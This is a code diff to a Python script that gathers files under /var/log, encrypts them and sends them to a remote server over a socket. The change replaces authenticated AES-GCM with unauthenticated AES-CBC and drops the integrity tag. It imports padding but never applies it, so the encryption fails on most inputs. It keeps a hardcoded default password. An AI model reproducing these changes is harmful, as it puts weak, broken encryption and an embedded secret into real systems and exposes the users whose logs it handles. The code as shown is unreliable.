@@ -7,8 +7,10 @@ import time
 
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import padding
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from cryptography.hazmat.primitives import hashes
-from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
+import os
 
 
 def discover_logs(directory="/var/log"):
@@ -22,25 +24,25 @@ def discover_logs(directory="/var/log"):
                 log_files.append(os.path.join(root, file))
     return log_files
 
-def get_aes_key(password: bytes, salt: bytes) -> bytes:
-    kdf = Scrypt(
-        salt=salt,
-        length=32,
-        n=2**14,
-        r=8,
-        p=1,
-        backend=default_backend()
-    )
-    return kdf.derive(password)
+def get_aes_key(password: str, salt: bytes) -> bytes:
+	kdf = PBKDF2HMAC(
+	algorithm=hashes.SHA256(),
+	length=32,
+	salt=salt,
+	iterations=100000,
+	backend=default_backend()
+	)
+	return kdf.derive(password.encode())
 
+#Encrypt data with AES-256-CBC
 def encrypt_log_content(file_content: bytes, key: bytes) -> bytes:
-    nonce = os.urandom(12) 
-    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce), backend=default_backend())
+    iv = os.urandom(16) 
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
     encryptor = cipher.encryptor()
     
     encrypted_content = encryptor.update(file_content) + encryptor.finalize()
 
-    return nonce + encrypted_content + encryptor.tag
+    return iv + encrypted_content
 
 def rsa_encrypt_aes_key(aes_key: bytes, public_key) -> bytes:
     from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
@@ -73,7 +75,7 @@ def send_log_to_server(server_ip: str, server_port: int, data: bytes):
     finally:
         client_socket.close()
 
-def encrypt_and_send_log_file(log_file: str, password: bytes = b'%Pa55w0rd') -> bool:
+def encrypt_and_send_log_file(log_file: str, password: str = '%Pa55w0rd') -> bool:
     try:
         with open(log_file, 'rb') as f:
             file_content = f.read()
